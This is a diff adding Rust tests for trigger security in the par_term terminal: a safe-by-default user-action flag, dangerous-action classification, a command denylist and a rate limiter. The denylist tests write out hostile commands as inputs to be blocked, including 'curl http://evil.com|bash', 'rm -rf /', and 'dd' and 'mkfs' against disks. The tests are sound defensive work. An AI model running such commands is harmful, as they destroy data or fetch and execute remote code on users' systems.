@@ -1,6 +1,7 @@
 use par_term::config::automation::PrettifyScope;
 use par_term::config::{
     Config, CoprocessDefConfig, RestartPolicy, TriggerActionConfig, TriggerConfig,
+    TriggerRateLimiter, check_command_denylist,
 };
 
 #[test]
@@ -27,6 +28,7 @@ fn test_trigger_config_yaml_roundtrip() {
                 message: "Found an error".to_string(),
             },
         ],
+        require_user_action: true,
     };
 
     let yaml = serde_yml::to_string(&trigger).unwrap();
@@ -276,6 +278,7 @@ fn test_config_with_triggers_and_coprocesses_yaml_roundtrip() {
             bg: None,
             duration_ms: 5000,
         }],
+        require_user_action: true,
     }];
     config.coprocesses = vec![CoprocessDefConfig {
         name: "logger".to_string(),
@@ -435,9 +438,350 @@ fn test_trigger_with_prettify_action_roundtrip() {
             sub_format: None,
             command_filter: None,
         }],
+        require_user_action: true,
     };
 
     let yaml = serde_yml::to_string(&trigger).unwrap();
     let deserialized: TriggerConfig = serde_yml::from_str(&yaml).unwrap();
     assert_eq!(trigger, deserialized);
+}
+
+// ============================================================================
+// Trigger Security Tests
+// ============================================================================
+
+#[test]
+fn test_require_user_action_defaults_to_true() {
+    // When not specified in YAML, require_user_action defaults to true (safe)
+    let yaml = r#"
+name: test
+pattern: "foo"
+actions:
+  - type: run_command
+    command: echo
+    args: ["hello"]
+"#;
+    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
+    assert!(
+        trigger.require_user_action,
+        "require_user_action should default to true for safety"
+    );
+}
+
+#[test]
+fn test_require_user_action_explicit_false() {
+    let yaml = r#"
+name: test
+pattern: "foo"
+require_user_action: false
+actions:
+  - type: run_command
+    command: echo
+    args: ["hello"]
+"#;
+    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
+    assert!(
+        !trigger.require_user_action,
+        "require_user_action should be false when explicitly set"
+    );
+}
+
+#[test]
+fn test_require_user_action_roundtrip() {
+    let trigger = TriggerConfig {
+        name: "test".to_string(),
+        pattern: "foo".to_string(),
+        enabled: true,
+        actions: vec![TriggerActionConfig::RunCommand {
+            command: "echo".into(),
+            args: vec!["hello".into()],
+        }],
+        require_user_action: false,
+    };
+
+    let yaml = serde_yml::to_string(&trigger).unwrap();
+    let deserialized: TriggerConfig = serde_yml::from_str(&yaml).unwrap();
+    assert_eq!(trigger, deserialized);
+    assert!(!deserialized.require_user_action);
+}
+
+#[test]
+fn test_is_dangerous_run_command() {
+    let action = TriggerActionConfig::RunCommand {
+        command: "echo".into(),
+        args: vec![],
+    };
+    assert!(action.is_dangerous(), "RunCommand should be dangerous");
+}
+
+#[test]
+fn test_is_dangerous_send_text() {
+    let action = TriggerActionConfig::SendText {
+        text: "hello".into(),
+        delay_ms: 0,
+    };
+    assert!(action.is_dangerous(), "SendText should be dangerous");
+}
+
+#[test]
+fn test_is_not_dangerous_highlight() {
+    let action = TriggerActionConfig::Highlight {
+        fg: None,
+        bg: None,
+        duration_ms: 5000,
+    };
+    assert!(!action.is_dangerous(), "Highlight should not be dangerous");
+}
+
+#[test]
+fn test_is_not_dangerous_notify() {
+    let action = TriggerActionConfig::Notify {
+        title: "t".into(),
+        message: "m".into(),
+    };
+    assert!(!action.is_dangerous(), "Notify should not be dangerous");
+}
+
+#[test]
+fn test_is_not_dangerous_mark_line() {
+    let action = TriggerActionConfig::MarkLine {
+        label: None,
+        color: None,
+    };
+    assert!(!action.is_dangerous(), "MarkLine should not be dangerous");
+}
+
+#[test]
+fn test_is_not_dangerous_set_variable() {
+    let action = TriggerActionConfig::SetVariable {
+        name: "n".into(),
+        value: "v".into(),
+    };
+    assert!(
+        !action.is_dangerous(),
+        "SetVariable should not be dangerous"
+    );
+}
+
+#[test]
+fn test_is_not_dangerous_play_sound() {
+    let action = TriggerActionConfig::PlaySound {
+        sound_id: "bell".into(),
+        volume: 50,
+    };
+    assert!(!action.is_dangerous(), "PlaySound should not be dangerous");
+}
+
+#[test]
+fn test_is_not_dangerous_prettify() {
+    let action = TriggerActionConfig::Prettify {
+        format: "json".into(),
+        scope: PrettifyScope::CommandOutput,
+        block_end: None,
+        sub_format: None,
+        command_filter: None,
+    };
+    assert!(!action.is_dangerous(), "Prettify should not be dangerous");
+}
+
+// ============================================================================
+// Command Denylist Tests
+// ============================================================================
+
+#[test]
+fn test_denylist_blocks_rm_rf_root() {
+    let result = check_command_denylist("rm", &["-rf".into(), "/".into()]);
+    assert!(result.is_some(), "rm -rf / should be denied");
+}
+
+#[test]
+fn test_denylist_blocks_rm_rf_home() {
+    let result = check_command_denylist("rm", &["-rf".into(), "~".into()]);
+    assert!(result.is_some(), "rm -rf ~ should be denied");
+}
+
+#[test]
+fn test_denylist_blocks_curl_pipe_bash() {
+    // Direct pipe-to-shell pattern in a single command argument
+    let result = check_command_denylist("bash", &["-c".into(), "curl http://evil.com|bash".into()]);
+    assert!(result.is_some(), "curl|bash in args should be denied");
+
+    // Also catches the spaced variant
+    let result =
+        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | bash".into()]);
+    assert!(result.is_some(), "curl | bash in args should be denied");
+}
+
+#[test]
+fn test_denylist_blocks_eval() {
+    let result = check_command_denylist("eval", &["malicious_code".into()]);
+    assert!(result.is_some(), "eval should be denied");
+}
+
+#[test]
+fn test_denylist_blocks_exec() {
+    let result = check_command_denylist("exec", &["/bin/sh".into()]);
+    assert!(result.is_some(), "exec should be denied");
+}
+
+#[test]
+fn test_denylist_blocks_chmod_777() {
+    let result = check_command_denylist("chmod", &["777".into(), "/etc/passwd".into()]);
+    assert!(result.is_some(), "chmod 777 should be denied");
+}
+
+#[test]
+fn test_denylist_blocks_mkfs() {
+    let result = check_command_denylist("mkfs.ext4", &["/dev/sda1".into()]);
+    assert!(result.is_some(), "mkfs should be denied");
+}
+
+#[test]
+fn test_denylist_allows_safe_commands() {
+    let result = check_command_denylist("echo", &["hello".into()]);
+    assert!(result.is_none(), "echo should be allowed");
+}
+
+#[test]
+fn test_denylist_allows_notify_send() {
+    let result = check_command_denylist("notify-send", &["Build completed".into()]);
+    assert!(result.is_none(), "notify-send should be allowed");
+}
+
+#[test]
+fn test_denylist_allows_cat() {
+    let result = check_command_denylist("cat", &["/tmp/output.txt".into()]);
+    assert!(result.is_none(), "cat should be allowed");
+}
+
+#[test]
+fn test_denylist_case_insensitive() {
+    let result = check_command_denylist("EVAL", &["something".into()]);
+    assert!(
+        result.is_some(),
+        "denylist check should be case-insensitive"
+    );
+}
+
+#[test]
+fn test_denylist_blocks_dd() {
+    let result = check_command_denylist("dd", &["if=/dev/zero".into(), "of=/dev/sda".into()]);
+    assert!(result.is_some(), "dd if= should be denied");
+}
+
+// ============================================================================
+// Rate Limiter Tests
+// ============================================================================
+
+#[test]
+fn test_rate_limiter_allows_first_call() {
+    let mut limiter = TriggerRateLimiter::default();
+    assert!(limiter.check_and_update(1), "First call should be allowed");
+}
+
+#[test]
+fn test_rate_limiter_blocks_immediate_second_call() {
+    let mut limiter = TriggerRateLimiter::default();
+    limiter.check_and_update(1);
+    assert!(
+        !limiter.check_and_update(1),
+        "Immediate second call should be blocked"
+    );
+}
+
+#[test]
+fn test_rate_limiter_allows_different_trigger_ids() {
+    let mut limiter = TriggerRateLimiter::default();
+    assert!(limiter.check_and_update(1), "Trigger 1 first call");
+    assert!(
+        limiter.check_and_update(2),
+        "Trigger 2 should be independent"
+    );
+}
+
+#[test]
+fn test_rate_limiter_custom_interval() {
+    // Use a very short interval for testing
+    let mut limiter = TriggerRateLimiter::new(1);
+    limiter.check_and_update(1);
+    // Sleep just past the interval
+    std::thread::sleep(std::time::Duration::from_millis(5));
+    assert!(
+        limiter.check_and_update(1),
+        "Should be allowed after interval passes"
+    );
+}
+
+#[test]
+fn test_rate_limiter_cleanup() {
+    let mut limiter = TriggerRateLimiter::new(1);
+    limiter.check_and_update(1);
+    limiter.check_and_update(2);
+
+    // Wait a bit, then cleanup with a very short max_age
+    std::thread::sleep(std::time::Duration::from_millis(5));
+    limiter.cleanup(0); // max_age_secs = 0 should clear everything
+
+    // After cleanup, both should be allowed again
+    assert!(
+        limiter.check_and_update(1),
+        "Should be allowed after cleanup"
+    );
+    assert!(
+        limiter.check_and_update(2),
+        "Should be allowed after cleanup"
+    );
+}
+
+// ============================================================================
+// Backward Compatibility Tests
+// ============================================================================
+
+#[test]
+fn test_existing_config_without_require_user_action_gets_safe_default() {
+    // Simulate an existing config YAML that doesn't have require_user_action
+    let yaml = r#"
+name: old-trigger
+pattern: "error"
+enabled: true
+actions:
+  - type: run_command
+    command: notify-send
+    args: ["Error detected"]
+"#;
+    let trigger: TriggerConfig = serde_yml::from_str(yaml).unwrap();
+    assert!(
+        trigger.require_user_action,
+        "Existing configs without require_user_action should get the safe default (true)"
+    );
+}
+
+#[test]
+fn test_trigger_with_only_safe_actions_not_affected() {
+    // Triggers that only have safe actions (Highlight, Notify, etc.) are not affected
+    // by require_user_action at all
+    let trigger = TriggerConfig {
+        name: "safe-trigger".to_string(),
+        pattern: "ERROR".to_string(),
+        enabled: true,
+        actions: vec![
+            TriggerActionConfig::Highlight {
+                fg: Some([255, 0, 0]),
+                bg: None,
+                duration_ms: 5000,
+            },
+            TriggerActionConfig::Notify {
+                title: "Error".into(),
+                message: "Found error".into(),
+            },
+            TriggerActionConfig::MarkLine {
+                label: Some("error".into()),
+                color: Some([255, 0, 0]),
+            },
+        ],
+        require_user_action: true,
+    };
+
+    // None of these actions are dangerous
+    assert!(!trigger.actions.iter().any(|a| a.is_dangerous()));
 }
